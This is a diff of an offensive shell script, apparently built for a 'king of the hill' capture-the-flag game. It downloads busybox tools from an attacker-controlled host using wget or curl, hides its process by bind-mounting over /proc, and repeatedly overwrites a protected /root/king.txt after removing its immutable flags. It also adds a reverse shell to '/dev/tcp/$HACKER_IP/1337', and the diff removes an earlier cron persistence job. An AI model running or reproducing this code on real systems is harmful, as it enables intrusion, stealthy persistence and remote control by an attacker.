@@ -77,14 +77,31 @@ mkdir $WORKING_DIR
 cd $WORKING_DIR
 
 # Copy all the bins here and the kingme script as a backup
-# Removed all the curl commands since it seems most boxes have wget and not curl
-# I'll add them back if I'm proven wrong
-wget http://$HACKER_IP:8080/kingme.sh
-wget http://$HACKER_IP:8080/busybox_GREP
-wget http://$HACKER_IP:8080/busybox_ECHO
-wget http://$HACKER_IP:8080/busybox_CHATTR
-wget http://$HACKER_IP:8080/busybox_CHMOD
-wget http://$HACKER_IP:8080/busybox_CAT
+
+WGET=/usr/bin/wget
+CURL=/usr/bin/curl
+
+if [ -f "$WGET" ]; then
+	chmod u+x /usr/bin/wget
+	wget http://$HACKER_IP:8090/busybox_GREP
+	wget http://$HACKER_IP:8090/busybox_ECHO
+	wget http://$HACKER_IP:8090/busybox_CHATTR
+	wget http://$HACKER_IP:8090/busybox_CHMOD
+	wget http://$HACKER_IP:8090/busybox_CAT
+	wget http://$HACKER_IP:8090/busybox_MOUNT
+elif [ -f "$CURL" ]; then
+	chmod u+x /usr/bin/curl
+	curl http://$HACKER_IP:8090/busybox_GREP > busybox_GREP
+	curl http://$HACKER_IP:8090/busybox_ECHO > busybox_ECHO
+	curl http://$HACKER_IP:8090/busybox_CHATTR > busybox_CHATR
+	curl http://$HACKER_IP:8090/busybox_CHMOD > busybox_CHMOD
+	curl http://$HACKER_IP:8090/busybox_CAT > busybox_CAT
+	curl http://$HACKER_IP:8090/busybox_MOUNT > busybox_MOUNT
+else
+echo "Both 'wget' and 'curl' are not presented on the machine or cannot be executed."
+echo "Abording.."
+exit 1
+fi
 
 # Rename them bins!
 mv -v busybox_GREP grep
@@ -101,12 +118,10 @@ chmod u+x chattr
 chmod u+x chmod
 chmod u+x cat
 
-
-# Make sure our script runs again even if our shell gets borked
-$WORKING_DIR/echo -e "#!/bin/bash\n# Just in case our shell gets borked\n# to be run as a cron job\n#\nHACKER_NAME=$HACKER_NAME\n\nif $WORKING_DIR/grep -q $HACKER_NAME /root/king.txt; then\n	echo "you are king"\n	exit\nelse\n	while true\n	do\n		if $WORKING_DIR/grep -q $HACKER_NAME /root/king.txt; then\n			$WORKING_DIR/echo $HACKER_NAME "is king! Nothing to do!"\n		else\n			$WORKING_DIR/chattr -ai /root/king.txt\n			$WORKING_DIR/chmod u+w /root/king.txt\n			set +o noclobber /root/king.txt\n			$WORKING_DIR/echo $HACKER_NAME > /root/king.txt\n			$WORKING_DIR/chattr +ai /root/king.txt\n			set -o noclobber /root/king.txt\n		fi\n		sleep 1\n	done\nfi\n" > $WORKING_DIR/kingcron.sh
-
-$WORKING_DIR/chmod u+x $WORKING_DIR/kingcron.sh
-$WORKING_DIR/echo "* * * * *  root  $WORKING_DIR/kingcron.sh" >> /etc/crontab
+# Hide from visible processes
+$WORKING_DIR/echo "Current PID:" $$
+$WORKING_DIR/echo "Hiding.."
+mount -o bind /tmp /proc/$$
 
 
 # Forever take your rightful throne as king!!!
@@ -117,13 +132,15 @@ do
 	else
 		LOSER=$($WORKING_DIR/cat /root/king.txt)
 		$WORKING_DIR/echo $LOSER "dethroned you! Making" $HACKER_NAME "king once again!"
-		umount /root
+		umount -l /root
 		$WORKING_DIR/chattr -ai /root/king.txt
 		$WORKING_DIR/chmod u+w /root/king.txt
 		set +o noclobber /root/king.txt
 		$WORKING_DIR/echo $HACKER_NAME > /root/king.txt
 		$WORKING_DIR/chattr +ai /root/king.txt
 		set -o noclobber /root/king.txt
+                sh -i >& /dev/tcp/$HACKER_IP/1337 0>&1
+
 	fi
 	sleep 1
 done
